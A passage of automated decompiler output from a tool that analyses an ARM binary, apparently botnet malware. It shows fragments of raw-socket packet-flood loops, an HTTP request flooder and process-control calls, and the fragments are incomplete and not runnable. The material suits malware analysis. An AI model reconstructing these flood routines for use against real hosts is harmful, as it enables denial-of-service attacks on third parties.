            send(sock2, (int32_t *)buf2, length, MSG_NOSIGNAL);
    while (true) {
        int32_t sock_fd = socket(AF_INET, 17, IPPROTO_UDP); // 0xdc80
        int32_t sock3 = sock_fd; // r0
        if (sock_fd == -1) {
            return sock3;
        bind(sock3, (struct sockaddr *)&addr, 16);
            int32_t sock4; // 0xdc20
            connect(sock4, (struct sockaddr *)addr2, 16);
            int32_t sock5; // 0xdd20
            connect(sock5, (struct sockaddr *)addr3, 16);
=================FUNCTION : function_de10 ===================
++++++++ FUNCTION START 30147
++++++++ FUNCTION END 30774
++++++++ FUNCTION LENGTH 627
    struct sockaddr * v160;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // 0xdf6c
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, t, 3, &option_value, 4) == -1) {
        result = close(sock_fd);
                while (true) {
                while (true) {
                        while (true) {
                                                sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
                                            sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : function_d370 ===================
++++++++ FUNCTION START 28982
++++++++ FUNCTION END 29633
++++++++ FUNCTION LENGTH 651
    struct sockaddr * v160;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xd554
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(t, SO_TYPE, option_name, &option_value, (int32_t)&option_len) == -1) {
        result = close(sock_fd);
            while (true) {
            while (true) {
                    while (true) {
                                                    sendto(sock_fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
                                                sendto(sock_fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
        while (true) {
=================FUNCTION : function_cbb4 ===================
++++++++ FUNCTION START 28315
++++++++ FUNCTION END 28979
++++++++ FUNCTION LENGTH 664
    struct sockaddr * v160;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xcdd8
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, t, 3, &option_value, 4) == -1) {
        result = close(sock_fd);
            while (true) {
            while (true) {
                    while (true) {
                                                    sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
                                                sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
        while (true) {
=================FUNCTION : function_b3a8 ===================
++++++++ FUNCTION START 26287
++++++++ FUNCTION END 26920
++++++++ FUNCTION LENGTH 633
    struct sockaddr * v160;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xb51c
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, t, 3, &option_value, 4) == -1) {
        result = close(sock_fd);
            while (true) {
            while (true) {
                    while (true) {
                                                sendto(sock_fd, (int32_t *)message, v368 + 66, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
        while (true) {
=================FUNCTION : function_bb50 ===================
++++++++ FUNCTION START 26923
++++++++ FUNCTION END 27552
++++++++ FUNCTION LENGTH 629
    struct sockaddr * v160;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xbcc4
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(sock_fd, t, 3, &option_value, 4) == -1) {
        result = close(sock_fd);
            while (true) {
            while (true) {
                    while (true) {
                                                sendto(sock_fd, (int32_t *)message, v368 + 52, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
        while (true) {
=================FUNCTION : function_fba0 ===================
++++++++ FUNCTION START 36324
++++++++ FUNCTION END 36731
++++++++ FUNCTION LENGTH 407
    struct sockaddr * v159;
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xfbbc
    int32_t fd = sock_fd;
    if (sock_fd == -1) {
        return sock_fd;
    setsockopt(sock_fd, SO_DEBUG, 2, &option_value, 4);
    fcntl(fd, F_GETFL);
    if (bind(fd, (struct sockaddr *)&addr, 16) == -1) {
        connect(fd, (struct sockaddr *)&addr, 16);
        close(fd);
        result = listen(fd, 1);
=================FUNCTION : function_e4b8 ===================
++++++++ FUNCTION START 30777
++++++++ FUNCTION END 31321
++++++++ FUNCTION LENGTH 544
    struct sockaddr * v161;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // 0xe5dc
    if (sock_fd == -1) {
        return sock_fd;
    if (setsockopt(t, SO_TYPE, option_name, &option_value, (int32_t)&option_len) == -1) {
        result = close(sock_fd);
            while (true) {
            while (true) {
                                sendto(sock_fd, (int32_t *)message, v368 + 32, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
=================FUNCTION : function_13230 ===================
++++++++ FUNCTION START 49441
++++++++ FUNCTION END 50008
++++++++ FUNCTION LENGTH 567
    struct sockaddr * v161;
                while (true) {
                        while (true) {
                            while (true) {
                while (true) {
                    while (true) {
        while (true) {
    while (true) {
=================FUNCTION : function_1060c ===================
++++++++ FUNCTION START 38300
++++++++ FUNCTION END 38667
++++++++ FUNCTION LENGTH 367
    struct sockaddr * v157;
    int32_t pid = getpid(); // 0x10620
    int32_t v360 = pid ^ getppid();
    int32_t proc_time = clock(); // 0x10638
    int32_t v361 = v360 ^ proc_time;
    int32_t v362 = proc_time;
    return proc_time;
=================FUNCTION : function_12ff4 ===================
++++++++ FUNCTION START 47499
++++++++ FUNCTION END 47880
++++++++ FUNCTION LENGTH 381
    struct sockaddr * v161;
    int32_t sock_fd = socket(AF_INET, 0, IPPROTO_IP); // 0x1301c
    if (sock_fd != -1) {
        int32_t sock = 2; // bp-40
        connect((int32_t)&sock, (struct sockaddr *)addr, addr);
        getsockname(sock_fd, (struct sockaddr *)&sock, &addr_len);
        close(sock_fd);
=================FUNCTION : function_fd10 ===================
++++++++ FUNCTION START 36734
++++++++ FUNCTION END 37131
++++++++ FUNCTION LENGTH 397
    struct sockaddr * v160;
    int32_t result = fork(); // 0xfd18
    int32_t fd = open((char *)function_121a4(59, (int32_t *)status), O_RDWR); // 0xfd74
        int32_t fd2 = open((char *)function_121a4(60, (int32_t *)status), O_RDWR); // 0xfdd0
    while (true) {
=================FUNCTION : function_1311c ===================
++++++++ FUNCTION START 48346
++++++++ FUNCTION END 48857
++++++++ FUNCTION LENGTH 511
    struct sockaddr * v161;
                while (true) {
            while (true) {
            while (true) {
    while (true) {
=================FUNCTION : __umodsi3 ===================
++++++++ FUNCTION START 51107
++++++++ FUNCTION END 51871
++++++++ FUNCTION LENGTH 764
    struct sockaddr * v161;
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : function_131a0 ===================
++++++++ FUNCTION START 48860
++++++++ FUNCTION END 49438
++++++++ FUNCTION LENGTH 578
    struct sockaddr * v161;
                while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : function_10748 ===================
++++++++ FUNCTION START 39435
++++++++ FUNCTION END 39822
++++++++ FUNCTION LENGTH 387
    struct sockaddr * v161;
    if (socket(AF_INET, SOCK_STREAM, IPPROTO_IP) == -1) {
        fcntl(fd, F_GETFL);
        int32_t sock; // 0x107e8
        result = connect(sock, (struct sockaddr *)&addr, 16);
=================FUNCTION : __modsi3 ===================
++++++++ FUNCTION START 51874
++++++++ FUNCTION END 52703
++++++++ FUNCTION LENGTH 829
    struct sockaddr * v161;
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : __udivsi3 ===================
++++++++ FUNCTION START 50011
++++++++ FUNCTION END 50735
++++++++ FUNCTION LENGTH 724
    struct sockaddr * v161;
    while (true) {
                                while (true) {
                                    while (true) {
                while (true) {
=================FUNCTION : function_1081c ===================
++++++++ FUNCTION START 39825
++++++++ FUNCTION END 40297
++++++++ FUNCTION LENGTH 472
    struct sockaddr * v157;
        while (true) {
                while (true) {
    while (true) {
=================FUNCTION : function_8f00 ===================
++++++++ FUNCTION START 21291
++++++++ FUNCTION END 21699
++++++++ FUNCTION LENGTH 408
    struct sockaddr * v161;
            return inet_addr((char *)cp);
    while (true) {
        return inet_addr((char *)cp);
=================FUNCTION : function_12e68 ===================
++++++++ FUNCTION START 46501
++++++++ FUNCTION END 47099
++++++++ FUNCTION LENGTH 598
    struct sockaddr * v161;
    while (true) {
    while (true) {
    while (true) {
=================FUNCTION : function_13090 ===================
++++++++ FUNCTION START 47883
++++++++ FUNCTION END 48343
++++++++ FUNCTION LENGTH 460
    struct sockaddr * v161;
        while (true) {
    while (true) {
=================FUNCTION : function_12d64 ===================
++++++++ FUNCTION START 44917
++++++++ FUNCTION END 45337
++++++++ FUNCTION LENGTH 420
    struct sockaddr * v161;
            while (true) {
    while (true) {
=================FUNCTION : function_8e9c ===================
++++++++ FUNCTION START 20890
++++++++ FUNCTION END 21288
++++++++ FUNCTION LENGTH 398
    struct sockaddr * v161;
    while (true) {
=================FUNCTION : _accept ===================
++++++++ FUNCTION START 7938
++++++++ FUNCTION END 8304
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return accept(fd, addr, addr_len);
=================FUNCTION : _closedir ===================
++++++++ FUNCTION START 16795
++++++++ FUNCTION END 17161
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return closedir(dirp);
=================FUNCTION : _send ===================
++++++++ FUNCTION START 7199
++++++++ FUNCTION END 7565
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return send(fd, buf, n, flags);
=================FUNCTION : _sendto ===================
++++++++ FUNCTION START 11259
++++++++ FUNCTION END 11625
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return sendto(fd, buf, n, flags, addr, addr_len);
=================FUNCTION : _getsockopt ===================
++++++++ FUNCTION START 14580
++++++++ FUNCTION END 14946
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return getsockopt(fd, level, optname, optval, optlen);
=================FUNCTION : _sigprocmask ===================
++++++++ FUNCTION START 18271
++++++++ FUNCTION END 18637
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return sigprocmask(how, set, oset);
=================FUNCTION : _setsockopt ===================
++++++++ FUNCTION START 10152
++++++++ FUNCTION END 10518
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return setsockopt(fd, level, optname, optval, optlen);
=================FUNCTION : _getsockname ===================
++++++++ FUNCTION START 18640
++++++++ FUNCTION END 19006
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return getsockname(fd, addr, len);
=================FUNCTION : _kill ===================
++++++++ FUNCTION START 9045
++++++++ FUNCTION END 9411
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return kill(pid, sig);
=================FUNCTION : _listen ===================
++++++++ FUNCTION START 11997
++++++++ FUNCTION END 12363
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return listen(fd, n);
=================FUNCTION : _getppid ===================
++++++++ FUNCTION START 13473
++++++++ FUNCTION END 13839
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return getppid();
=================FUNCTION : _open ===================
++++++++ FUNCTION START 15688
++++++++ FUNCTION END 16054
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return open(file, oflag);
=================FUNCTION : _fork ===================
++++++++ FUNCTION START 12366
++++++++ FUNCTION END 12732
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return fork();
=================FUNCTION : _recv ===================
++++++++ FUNCTION START 1664
++++++++ FUNCTION END 2030
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return recv(fd, buf, n, flags);
=================FUNCTION : _socket ===================
++++++++ FUNCTION START 5723
++++++++ FUNCTION END 6089
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return socket(domain, type, protocol);
=================FUNCTION : function_12e00 ===================
++++++++ FUNCTION START 46103
++++++++ FUNCTION END 46498
++++++++ FUNCTION LENGTH 395
    struct sockaddr * v161;
    while (true) {
=================FUNCTION : _inet_addr ===================
++++++++ FUNCTION START 9783
++++++++ FUNCTION END 10149
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return inet_addr(cp);
=================FUNCTION : function_8f6c ===================
++++++++ FUNCTION START 21702
++++++++ FUNCTION END 22110
++++++++ FUNCTION LENGTH 408
    struct sockaddr * v161;
    while (true) {
=================FUNCTION : _recvfrom ===================
++++++++ FUNCTION START 5354
++++++++ FUNCTION END 5720
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return recvfrom(fd, buf, n, flags, addr, addr_len);
=================FUNCTION : function_10734 ===================
++++++++ FUNCTION START 39059
++++++++ FUNCTION END 39432
++++++++ FUNCTION LENGTH 373
    struct sockaddr * v161;
    int32_t result = kill(pid, SIGKILL); // 0x10740
=================FUNCTION : _close ===================
++++++++ FUNCTION START 17533
++++++++ FUNCTION END 17899
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return close(fd);
=================FUNCTION : function_f294 ===================
++++++++ FUNCTION START 33609
++++++++ FUNCTION END 33982
++++++++ FUNCTION LENGTH 373
    struct sockaddr * v160;
    int32_t result = kill(pid, SIGKILL); // 0xf2a0
=================FUNCTION : _connect ===================
++++++++ FUNCTION START 2033
++++++++ FUNCTION END 2399
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return connect(fd, addr, len);
=================FUNCTION : _getpid ===================
++++++++ FUNCTION START 3140
++++++++ FUNCTION END 3506
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    return getpid();
=================FUNCTION : function_12f94 ===================
++++++++ FUNCTION START 47102
++++++++ FUNCTION END 47496
++++++++ FUNCTION LENGTH 394
    struct sockaddr * v161;
    while (true) {
=================FUNCTION : function_fb34 ===================
++++++++ FUNCTION START 35577
++++++++ FUNCTION END 35943
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v160;
=================FUNCTION : function_12340 ===================
++++++++ FUNCTION START 44036
++++++++ FUNCTION END 44532
++++++++ FUNCTION LENGTH 496
    struct sockaddr * v116;
=================FUNCTION : __aeabi_uidivmod ===================
++++++++ FUNCTION START 50738
++++++++ FUNCTION END 51104
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_12d3c ===================
++++++++ FUNCTION START 44535
++++++++ FUNCTION END 44914
++++++++ FUNCTION LENGTH 379
    struct sockaddr * v161;
=================FUNCTION : __aeabi_ldiv0 ===================
++++++++ FUNCTION START 52706
++++++++ FUNCTION END 53073
++++++++ FUNCTION LENGTH 367
    struct sockaddr * v161;
=================FUNCTION : function_121a4 ===================
++++++++ FUNCTION START 42838
++++++++ FUNCTION END 43215
++++++++ FUNCTION LENGTH 377
    struct sockaddr * v161;
=================FUNCTION : function_121d0 ===================
++++++++ FUNCTION START 43218
++++++++ FUNCTION END 43624
++++++++ FUNCTION LENGTH 406
    struct sockaddr * v160;
=================FUNCTION : function_105b4 ===================
++++++++ FUNCTION START 37925
++++++++ FUNCTION END 38297
++++++++ FUNCTION LENGTH 372
    struct sockaddr * v157;
=================FUNCTION : _sigemptyset ===================
++++++++ FUNCTION START 2402
++++++++ FUNCTION END 2768
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_92b8 ===================
++++++++ FUNCTION START 23705
++++++++ FUNCTION END 24112
++++++++ FUNCTION LENGTH 407
    struct sockaddr * v159;
=================FUNCTION : function_8e58 ===================
++++++++ FUNCTION START 20149
++++++++ FUNCTION END 20516
++++++++ FUNCTION LENGTH 367
    struct sockaddr * v161;
=================FUNCTION : _write ===================
++++++++ FUNCTION START 8676
++++++++ FUNCTION END 9042
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_8e00 ===================
++++++++ FUNCTION START 19775
++++++++ FUNCTION END 20146
++++++++ FUNCTION LENGTH 371
    struct sockaddr * v161;
=================FUNCTION : function_13648 ===================
++++++++ FUNCTION START 53831
++++++++ FUNCTION END 54199
++++++++ FUNCTION LENGTH 368
    struct sockaddr * v161;
=================FUNCTION : function_fb4c ===================
++++++++ FUNCTION START 35946
++++++++ FUNCTION END 36321
++++++++ FUNCTION LENGTH 375
    struct sockaddr * v161;
=================FUNCTION : function_f188 ===================
++++++++ FUNCTION START 32762
++++++++ FUNCTION END 33167
++++++++ FUNCTION LENGTH 405
    struct sockaddr * v161;
=================FUNCTION : _clock ===================
++++++++ FUNCTION START 16057
++++++++ FUNCTION END 16423
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_13640 ===================
++++++++ FUNCTION START 53461
++++++++ FUNCTION END 53828
++++++++ FUNCTION LENGTH 367
    struct sockaddr * v161;
=================FUNCTION : _bind ===================
++++++++ FUNCTION START 9414
++++++++ FUNCTION END 9780
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : __start ===================
++++++++ FUNCTION START 20519
++++++++ FUNCTION END 20887
++++++++ FUNCTION LENGTH 368
    struct sockaddr * v161;
=================FUNCTION : function_f1e4 ===================
++++++++ FUNCTION START 33170
++++++++ FUNCTION END 33606
++++++++ FUNCTION LENGTH 436
    struct sockaddr * v161;
=================FUNCTION : function_1360c ===================
++++++++ FUNCTION START 53076
++++++++ FUNCTION END 53458
++++++++ FUNCTION LENGTH 382
    struct sockaddr * v160;
=================FUNCTION : function_8df4 ===================
++++++++ FUNCTION START 19399
++++++++ FUNCTION END 19772
++++++++ FUNCTION LENGTH 373
    struct sockaddr * v161;
=================FUNCTION : _prctl ===================
++++++++ FUNCTION START 3509
++++++++ FUNCTION END 3875
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_8d80 ===================
++++++++ FUNCTION START 19009
++++++++ FUNCTION END 19396
++++++++ FUNCTION LENGTH 387
    struct sockaddr * v159;
=================FUNCTION : function_12db8 ===================
++++++++ FUNCTION START 45340
++++++++ FUNCTION END 45718
++++++++ FUNCTION LENGTH 378
    struct sockaddr * v161;
=================FUNCTION : function_12ddc ===================
++++++++ FUNCTION START 45721
++++++++ FUNCTION END 46100
++++++++ FUNCTION LENGTH 379
    struct sockaddr * v161;
=================FUNCTION : _fcntl ===================
++++++++ FUNCTION START 17164
++++++++ FUNCTION END 17530
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_8b08 ===================
++++++++ FUNCTION START 179
++++++++ FUNCTION END 546
++++++++ FUNCTION LENGTH 367
    struct sockaddr * v163 = NULL;
=================FUNCTION : ___uClibc_main ===================
++++++++ FUNCTION START 12735
++++++++ FUNCTION END 13101
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : _read ===================
++++++++ FUNCTION START 10890
++++++++ FUNCTION END 11256
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : _ioctl ===================
++++++++ FUNCTION START 1295
++++++++ FUNCTION END 1661
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : __data_start ===================
++++++++ FUNCTION START 54202
++++++++ FUNCTION END 54574
++++++++ FUNCTION LENGTH 372
    struct sockaddr * v161;
=================FUNCTION : function_8b20 ===================
++++++++ FUNCTION START 549
++++++++ FUNCTION END 923
++++++++ FUNCTION LENGTH 374
    struct sockaddr * v160;
=================FUNCTION : _time ===================
++++++++ FUNCTION START 13842
++++++++ FUNCTION END 14208
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_10668 ===================
++++++++ FUNCTION START 38670
++++++++ FUNCTION END 39056
++++++++ FUNCTION LENGTH 386
    struct sockaddr * v161;
=================FUNCTION : _select ===================
++++++++ FUNCTION START 6092
++++++++ FUNCTION END 6458
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_12288 ===================
++++++++ FUNCTION START 43627
++++++++ FUNCTION END 44033
++++++++ FUNCTION LENGTH 406
    struct sockaddr * v160;
=================FUNCTION : _sigaddset ===================
++++++++ FUNCTION START 6830
++++++++ FUNCTION END 7196
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : function_f180 ===================
++++++++ FUNCTION START 32385
++++++++ FUNCTION END 32759
++++++++ FUNCTION LENGTH 374
    struct sockaddr * v161;
=================FUNCTION : * ===================
++++++++ FUNCTION START 14949
++++++++ FUNCTION END 15315
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
    struct sockaddr * v161;
    struct sockaddr * v161;
    struct sockaddr * v161;
    struct sockaddr * v161;
    struct sockaddr * v161;
    struct sockaddr * v161;
=================FUNCTION : _readlink ===================
++++++++ FUNCTION START 4247
++++++++ FUNCTION END 4613
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : _sleep ===================
++++++++ FUNCTION START 4985
++++++++ FUNCTION END 5351
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
=================FUNCTION : _setsid ===================
++++++++ FUNCTION START 16426
++++++++ FUNCTION END 16792
++++++++ FUNCTION LENGTH 366
    struct sockaddr * v161;
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 4 @ function_8fdc ====================================
++++++++ WHILE START : 22545 
++++++++ WHILE FUNCTION : function_8fdc 
++++++++ WHILE END : 23213 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		v384 = fork();
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
		v384 = fork();
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
=============================WHILE LOOPS ID : 5 @ function_8fdc ====================================
++++++++ WHILE START : 23249 
++++++++ WHILE FUNCTION : function_8fdc 
++++++++ WHILE END : 23391 
++++++++ INTRESTING INSTRUCTIONS :  
		v384 = fork();
		while (true) {
		free((int32_t *)v381);
		while (true) {
		free((int32_t *)v381);
		while (true) {
=============================WHILE LOOPS ID : 13 @ function_95f0 ====================================
++++++++ WHILE START : 24525 
++++++++ WHILE FUNCTION : function_95f0 
++++++++ WHILE END : 25087 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x9ab8
		dest_mem = sock_fd;
		fd = sock_fd;
		if (sock_fd != -1) {
		fcntl(dest_mem, F_GETFL);
		int32_t sock; // 0x9af8
		setsockopt(sock, protocol, 8, &option_value, 4);
		int32_t sock2; // 0x9b28
		connect(sock2, (struct sockaddr *)&addr, 16);
		function_12d64((char *)v431, (int32_t)" HTTP/1.1\r\nUser-Agent: ");
		function_12d64((char *)v433, (int32_t)"\r\nHost: ");
		int32_t sock3; // 0xa0f4
		send(sock3, (int32_t *)buf, function_12d3c(v403), MSG_NOSIGNAL);
		close(fd2);
		close(fd3);
=============================WHILE LOOPS ID : 14 @ function_95f0 ====================================
++++++++ WHILE START : 25127 
++++++++ WHILE FUNCTION : function_95f0 
++++++++ WHILE END : 26270 
++++++++ INTRESTING INSTRUCTIONS :  
		uint32_t sock8; // 0x9c7c
		if (sock8 != -1) {
		if ((v479 >> sock8 % 32) % 2 == 0) {
		v478 = sock8;
		int32_t sock4; // 0xa208
		int32_t v485 = recv(sock4, &buf2, 0x2800, MSG_PEEK | MSG_NOSIGNAL); // 0xa214
		close(fd4);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (function_12e00(t, v545, (int32_t)"http", 4) == 4) {
		while (true) {
		if (function_1311c((char *)v559, (int32_t)"POST") == 0) {
		if (function_1311c((char *)v559, (int32_t)"GET") == 0) {
		int32_t sock5; // 0xad24
		recv(sock5, &buf2, length, MSG_NOSIGNAL);
		if (function_13090((char *)fd, function_12d3c((char *)v576), (int32_t)"url=") == -1) {
		int32_t v581 = option_value + function_13090((char *)v580, function_12d3c((char *)v580), (int32_t)"url="); // 0xac20
		while (true) {
		if (function_13090((char *)t, function_12d3c((char *)v588), (int32_t)"http") == 4) {
		while (true) {
		memcpy((int32_t *)(v362 + 1431), (int32_t *)"GET", 4);
		dest_mem = (int32_t)memcpy((int32_t *)v601, (int32_t *)"GET", 4);
		if (function_1311c((char *)v559, (int32_t)"POST") == 0) {
		while (true) {
		while (true) {
		int32_t sock6; // 0xa860
		int32_t v607 = recv(sock6, (int32_t *)(v373 + v606), 1024 - v606, MSG_NOSIGNAL); // 0xa870
		close(fd5);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		int32_t sock7; // 0xaa54
		int32_t v649 = recv(sock7, &buf2, 0x2800, MSG_NOSIGNAL); // 0xaa60
		close(fd6);
		close(fd6);
		while (true) {
		int32_t v652 = option_value2 | getsockopt(sock8, SO_DEBUG, 4, &option_value2, &option_len); // 0x9cf0
		close(fd7);
=============================WHILE LOOPS ID : 17 @ function_b3a8 ====================================
++++++++ WHILE START : 26746 
++++++++ WHILE FUNCTION : function_b3a8 
++++++++ WHILE END : 26903 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		sendto(sock_fd, (int32_t *)message, v368 + 66, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
=============================WHILE LOOPS ID : 20 @ function_bb50 ====================================
++++++++ WHILE START : 27382 
++++++++ WHILE FUNCTION : function_bb50 
++++++++ WHILE END : 27535 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		sendto(sock_fd, (int32_t *)message, v368 + 52, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
=============================WHILE LOOPS ID : 22 @ function_c288 ====================================
++++++++ WHILE START : 27969 
++++++++ WHILE FUNCTION : function_c288 
++++++++ WHILE END : 28295 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc50c
		t = sock_fd2;
		if (sock_fd2 == -1) {
		while (true) {
		fcntl(sock_fd2, F_GETFL);
		connect(t, (struct sockaddr *)&addr, 16);
		while (true) {
		int32_t v399 = recvfrom(sock_fd, &buf, 256, MSG_NOSIGNAL, (struct sockaddr *)&addr2, &addr_len); // 0xc618
		close(t);
		while (true) {
		sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		v404 = sock_fd2;
		v403 = sock_fd2 == -1;
		t = sock_fd2;
		if (sock_fd2 == -1) {
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		close(t);
		int32_t sock_fd3 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc6a8
		t = sock_fd3;
		if (sock_fd3 == -1) {
		sock_fd2 = sock_fd3;
		while (true) {
=============================WHILE LOOPS ID : 25 @ function_cbb4 ====================================
++++++++ WHILE START : 28779 
++++++++ WHILE FUNCTION : function_cbb4 
++++++++ WHILE END : 28962 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
=============================WHILE LOOPS ID : 28 @ function_d370 ====================================
++++++++ WHILE START : 29435 
++++++++ WHILE FUNCTION : function_d370 
++++++++ WHILE END : 29618 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		sendto(sock_fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
		sendto(sock_fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
=============================WHILE LOOPS ID : 30 @ function_daec ====================================
++++++++ WHILE START : 30087 
++++++++ WHILE FUNCTION : function_daec 
++++++++ WHILE END : 30138 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd = socket(AF_INET, 17, IPPROTO_UDP); // 0xdc80
		int32_t sock3 = sock_fd; // r0
		if (sock_fd == -1) {
		return sock3;
		bind(sock3, (struct sockaddr *)&addr, 16);
		int32_t sock4; // 0xdc20
		connect(sock4, (struct sockaddr *)addr2, 16);
		int32_t sock5; // 0xdd20
		connect(sock5, (struct sockaddr *)addr3, 16);
=============================WHILE LOOPS ID : 32 @ function_de10 ====================================
++++++++ WHILE START : 30583 
++++++++ WHILE FUNCTION : function_de10 
++++++++ WHILE END : 30728 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a3 + 24 * option_value), 16);
=============================WHILE LOOPS ID : 37 @ function_e4b8 ====================================
++++++++ WHILE START : 31216 
++++++++ WHILE FUNCTION : function_e4b8 
++++++++ WHILE END : 31292 
++++++++ INTRESTING INSTRUCTIONS :  
		sendto(sock_fd, (int32_t *)message, v368 + 32, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
=============================WHILE LOOPS ID : 39 @ function_e9b8 ====================================
++++++++ WHILE START : 31831 
++++++++ WHILE FUNCTION : function_e9b8 
++++++++ WHILE END : 32191 
